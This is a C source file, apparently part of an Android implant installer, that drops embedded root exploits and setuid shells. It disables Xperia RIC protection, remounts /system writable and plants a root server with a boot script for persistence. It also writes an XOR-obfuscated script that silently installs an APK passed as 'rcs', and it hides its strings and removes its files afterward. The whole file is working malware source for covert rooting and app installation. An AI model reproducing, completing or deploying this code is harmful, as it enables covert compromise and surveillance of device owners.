#include <stdio.h>
#include <sys/time.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/mount.h>

#include "xperia_ric_manager.h"
#include "shell_installer.h"
#include "knox_manager.h"
#include "log.h"
#include "shell_params.h"
#include "deobfuscate.h"
#include "old_shell.h"
#include "utils.h"
#include "boot_manager.h"
#include "bin_oldsuidext.h"
#include "bin_suidext.h"
#include "ps.h"
#ifdef SHARED_LIB
#include "bin_legacyexp.h"
#endif

static unsigned char system_str[] = "\x76\xcb\xba\xef\x1b\x11\x1b\x06\x15\x2d"; // "/system"
static unsigned char stmp1[] = "\xc0\xf7\x32\x5d\x5c\x53\x50\x1f"; // "stmp1" 
static unsigned char sotmp1[] = "\x5f\xe5\xbc\xf4\xf0\xf5\xf2\xf1\xb6"; // "sotmp1"
static unsigned char shtmp[] = "\x53\xd9\x8f\x20\xcd\xd9\xce\x25"; // "shtmp"
static unsigned char etmp[] = "\xad\x4d\xe4\x58\x6b\x40\x67"; // "etmp"
static unsigned char exp_str[] = "\x24\x5d\x75\x3a\x35\x03\xe9\x3c\x3a\x35\x03\xe9\x3c\xee\xf0"; // "./%s ./%s rt"

#ifdef SHARED_LIB
void exec_legacy_exploit() {

  FILE * fd_oldshell  = fopen(deobfuscate(sotmp1), "w"); // old setuid shell
  FILE * fd_legacyexp  = fopen(deobfuscate(etmp), "w"); // old setuid shell
  char cmd[512];

  LOGD("[INSTALLER] Starting legacy exploitation\n");

  if(!fd_oldshell || !fd_legacyexp) {
    LOGD("[INSTALLER] Failed to create file for legacy exp\n");
    return;
  }

  fwrite(&bin_legacy_get_root, 1, sizeof(bin_legacy_get_root), fd_legacyexp);
  fwrite(&binoldsuidext, 1, sizeof(binoldsuidext), fd_oldshell);

  fclose(fd_legacyexp);
  fclose(fd_oldshell);

  chmod(deobfuscate(etmp), 0777);
  chmod(deobfuscate(sotmp1), 0777);

  memset(cmd, 0, sizeof(cmd));
  snprintf(cmd, sizeof(cmd), deobfuscate(exp_str), deobfuscate(etmp), deobfuscate(sotmp1));

  LOGD("[INSTALLER] Starting exploitation\n");
  system(cmd);
  LOGD("[INSTALLER] Legacy done\n");

  remove(deobfuscate(etmp));
  remove(deobfuscate(sotmp1));

}

#endif

// Install the root shell.
// - Copy the sh script in /system/etc (boot start)
// - Copy the root_server bin in /system/bin
int install_shell(char * shell_server_path) {
  FILE *f1 = NULL;
  FILE *f2 = NULL;
  char install_script[1024];
  char shell_server[256];
  char shell_script[256];  
  char current_path[512];
  struct stat st;

  memset(current_path, 0, sizeof(current_path));
  getcwd(current_path, sizeof(current_path));
  strcat(current_path, "/");

  memset(shell_server, 0, sizeof(shell_server));
  if(shell_server_path == NULL) 
    snprintf(shell_server, sizeof(shell_server), "%s%s", current_path, deobfuscate(stmp1));  
  else
    strncpy(shell_server, shell_server_path, sizeof(shell_server));

  memset(install_script, 0, sizeof(install_script));
  
  LOGD("Installing shell");

  // Check for xperia protection ric
  if(is_ric_present())
    remove_ric();

  // Mount /system partition as rw
  remount(deobfuscate(system_str), 0);

  remove(deobfuscate(ROOT_BIN));

  // Copy root client

  f1 = fopen(shell_server, "r");
  f2 = fopen(deobfuscate(ROOT_BIN), "w");

  if(!f1 || !f2)
    return -1;  

  if(fcopy(f1, f2) < 0)
    return -1;

  chmod(deobfuscate(ROOT_BIN), 0755);

  fclose(f1);
  fclose(f2);

  // Create the proper boot script
  createBootScript();

  return 1;
}


// Install the old setuid shell
int install_legacy_shell(void) {
  char current_path[512];
  char old_shell_path[512];

  getcwd(current_path, sizeof(current_path));
  strcat(current_path, "/");

  memset(old_shell_path, 0, sizeof(old_shell_path));  
  snprintf(old_shell_path, sizeof(old_shell_path), "%s%s", current_path, deobfuscate(sotmp1));

  return install_old_shell(old_shell_path);
}

// For the remote vector we need to extract what we need.

#ifndef LOCAL
// Create shell files on fs
void extract_shell_files(char * rcs) {
  unsigned char enc_script[] = "\xc3\x26\x38\x20\x2e\x34\xf0\xc6\xf0\xfb\xea\xf2\x34\xe1\xf6\xf5\x34\xf0\xf7\xc9\xe0\xee\xfb\x2f\x2a\xf0\x2f\x05\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9\xf1\xf2\x2f\x2a\xf0\xc9\xe0\xf7\xf2\xf4\xeb\x2f\x3c\x3a\x3a\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9\xf0\xea\xfb\xfb\xf6\xf5\xec\xf0\x2f\xff\xfa\xfb\x2f\xec\xf3\xf4\xe1\xee\xf3\x2f\xff\xee\xe0\xe8\xee\xec\xea\xe4\xfd\xea\xf1\xf6\xed\xf6\xea\xf1\xe4\xea\xf5\xee\xe1\xf3\xea\x2f\x3f\xc9\xff\xf2\x2f\xeb\xf6\xf0\xee\xe1\xf3\xea\x2f\xe0\xf4\xf2\x35\xee\xf5\xeb\xf1\xf4\xf6\xeb\x35\xfd\xea\xf5\xeb\xf6\xf5\xec\xc9\xf0\xf3\xea\xea\xff\x2f\x3e\xc9\xff\xf2\x2f\xf6\xf5\xf0\xfb\xee\xf3\xf3\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9\xf1\xf2\x2f\x34\xeb\xee\xfb\xee\x34\xf3\xf4\xe0\xee\xf3\x34\xfb\xf2\xff\x34\xfb\xf2\xff\xc9"; // Install script

  unsigned char enc_script2[] = "\xfd\x33\x45\xfc\xf0\x23\xf2\x8f\xfc\xf1\x8f\xf2\xf8\xf1\x8d\xf4\xe2\xf8\x23\x30\xf5\x23\xe2\xf6\xf0\x35\xfc\xf5\xff\xf1\xf6\xf4\xff\x35\xff\x8d\xe2\xf4\x36\x35\xd2\xf8\xf1\x8d\xf4\xe2\xf8\xd0\xfc\xf4\xf5\x19\xf2\xf7\xf8\xf8\xf3\x23\x31\x19\xf2\xf8\x8f\x8f\xf4\xf5\xfe\xf2\x23\xf3\x88\x8f\x23\xfe\xf7\xf6\xe1\xfc\xf7\x23\xf3\xfc\xe2\xfa\xfc\xfe\xf8\xe6\x8d\xf8\xf1\xf4\xfd\xf4\xf8\xf1\xe6\xf8\xf5\xfc\xe1\xf7\xf8\x23\xcc\x19\xf3\xf0\x23\xf8\xf5\xfc\xe1\xf7\xf8\x23\xe2\xf6\xf0\x35\xfc\xf5\xff\xf1\xf6\xf4\xff\x35\x8d\xf8\xf5\xff\xf4\xf5\xfe\x19\xf1\xf0\x23\x38\xf2\x19";

  FILE * fd_shell     = fopen(deobfuscate(stmp1), "w");  // daemonized shell
  FILE * fd_oldshell  = fopen(deobfuscate(sotmp1), "w"); // old setuid shell
  FILE * install_rcs  = NULL;
  char script[1024];
  char script2[1024];
  char complete_script[2048];
  char current_path_shtmp[512];

  memset(current_path_shtmp, 0, sizeof(current_path_shtmp));

  getcwd(current_path_shtmp, sizeof(current_path_shtmp));
  strcat(current_path_shtmp, "/");
  strcat(current_path_shtmp, deobfuscate(shtmp));

  fwrite(&binsuidext, 1, sizeof(binsuidext), fd_shell);
  fwrite(&binoldsuidext, 1, sizeof(binoldsuidext), fd_oldshell);

  fclose(fd_shell);
  fclose(fd_oldshell);

  // For the remote vector install the apk. Not for shared library.
  if(rcs) {
    install_rcs = fopen(deobfuscate(shtmp), "w");  // installation script

    memset(&script, 0, sizeof(script));
    memset(&complete_script, 0, sizeof(complete_script));

    snprintf(script, sizeof(script), deobfuscate(enc_script), rcs, rcs);
    snprintf(script2, sizeof(script2), deobfuscate(enc_script2), current_path_shtmp);

    snprintf(complete_script, sizeof(complete_script), "%s%s", script, script2);

    fwrite(&complete_script, 1, strlen(complete_script), install_rcs);
    fclose(install_rcs);
    chmod(deobfuscate(shtmp), 0777);
  }

  chmod(deobfuscate(stmp1), 0777);
  chmod(deobfuscate(sotmp1), 0777);
}

// Clean up files
void cleanup(void) {

  remove(deobfuscate(stmp1));
  remove(deobfuscate(sotmp1));

}


// Exec the installazion script using our root shell
void start_script(void) {
  char script_rcs[512];
  char current_path[512];
  unsigned char qzx[] = "\x8c\x90\x1f\x1d\x16\x14"; // "qzx"

  LOGD("[INSTALLER] Installing apk...\n");

  memset(current_path, 0, sizeof(current_path));

  getcwd(current_path, sizeof(current_path));
  strcat(current_path, "/");

  memset(script_rcs, 0, sizeof(script_rcs));
  snprintf(script_rcs, sizeof(script_rcs), "%s %s %s%s", deobfuscate(ROOT_BIN), deobfuscate(qzx), current_path, deobfuscate(shtmp));

  system(script_rcs);

  return;

}

#endif
